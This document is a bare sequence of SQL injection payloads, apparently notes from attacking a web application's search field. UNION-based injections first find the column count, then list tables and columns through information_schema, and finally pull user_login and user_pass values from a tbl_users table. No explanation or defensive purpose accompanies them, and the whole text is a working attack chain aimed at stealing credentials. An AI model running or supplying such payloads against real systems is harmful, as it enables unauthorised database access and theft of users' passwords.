SELECT ?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,? FROM ? WHERE ? LIKE '%
' ORDER BY 26;#
'
' UNION (SELECT 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,false,'hello','hello','hello','hello' FROM dual);#
'
noresults' UNION (SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM tbl_collectionResourceMap.map_Id);#
'
noresults' UNION (SELECT 1,2,3,4,5,TABLE_NAME,7,8,9,10,'hello','hello','hello','hello','hello','hello','hello','hello','hello','hello','hello',TABLE_NAME,'hello','hello','hello','hello' FROM information_schema.TABLES);#
'
' UNION (SELECT 1,2,3,4,5,COLUMN_NAME,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM information_schema.columns WHERE TABLE_NAME='tbl_users');#
'
' UNION (SELECT 1,2,3,4,5,user_login,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM tbl_users);#
'
' UNION (SELECT 1,2,3,4,5,user_pass,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM tbl_users);#
